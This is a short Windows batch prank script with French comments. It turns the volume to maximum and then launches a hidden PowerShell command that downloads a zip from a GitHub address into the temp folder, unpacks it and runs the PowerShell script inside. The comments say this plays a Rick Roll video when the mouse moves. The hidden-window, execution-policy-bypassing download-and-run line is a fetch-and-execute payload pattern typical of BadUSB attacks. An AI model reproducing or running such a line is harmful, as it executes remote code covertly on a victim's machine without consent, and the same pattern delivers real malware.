@echo off

REM met le volume à fond pour avoir une bonne surprise sonore ;)
powershell "1..50 | ForEach-Object { (new-object -com wscript.shell).SendKeys([char]175) }"

REM lance un rick roll depuis internet
REM quand capslock clignote, il suffira de bouger la souris pour lancer la vidéo
powershell -w h -NoP -NonI -Exec Bypass $U='https://github.com/I-Am-Jakoby/I-Am-Jakoby/raw/main/Assets/rr.zip';$Z="$env:TMP"+'\rr.zip';$D="$env:TMP"+'\rr';iwr -Uri $U -O $Z;Expand-Archive $Z -DestinationPath $D\ -Force;powershell $D\rr.ps1
